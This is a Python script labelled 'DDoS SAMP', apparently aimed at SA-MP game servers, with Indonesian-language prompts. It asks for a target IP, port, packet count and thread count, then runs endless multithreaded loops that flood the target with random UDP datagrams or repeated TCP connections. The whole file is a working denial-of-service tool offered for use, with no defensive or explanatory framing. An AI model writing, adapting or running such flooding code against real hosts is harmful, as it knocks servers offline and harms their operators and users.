#!/usr/bin/env python3
#CODE BY Leeon123
#CODED / REMAKE BY TRAYLINZ
import random
import socket
import threading

print       (" - - > ██████╗░██████╗░░█████╗░░██████╗  ░██████╗░█████╗░███╗░░░███╗██████╗░ < - - ")
print       (" - - > ██╔══██╗██╔══██╗██╔══██╗██╔════╝  ██╔════╝██╔══██╗████╗░████║██╔══██╗ < - - ")
print       (" - - > ██║░░██║██║░░██║██║░░██║╚█████╗░  ╚█████╗░███████║██╔████╔██║██████╔╝ < - - ")
print       (" - - > ██║░░██║██║░░██║██║░░██║░╚═══██╗  ░╚═══██╗██╔══██║██║╚██╔╝██║██╔═══╝░ < - - ")
print       (" - - > ██████╔╝██████╔╝╚█████╔╝██████╔╝  ██████╔╝██║░░██║██║░╚═╝░██║██║░░░░░ < - - ")     
print       (" - - > ╚═════╝░╚═════╝░░╚════╝░╚═════╝░  ╚═════╝░╚═╝░░╚═╝╚═╝░░░░░╚═╝╚═╝░░░░░ < - - ")
	     
print("--> DDoS SAMP <--")
print("#-- TCP/UDP FLOOD --#")
ip = str(input(" IP:"))
port = int(input(" PORT:"))
choice = str(input(" UDP(y/n):"))
times = int(input(" PAKET YANG MAU DI KIRIM:"))
threads = int(input(" THREADS:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" PUNTEN PAKET!!")
		except:
			print("[!] GAGAL!!!")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" PUNTEN PAKET!!")
		except:
			s.close()
			print("[*] GAGAL")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
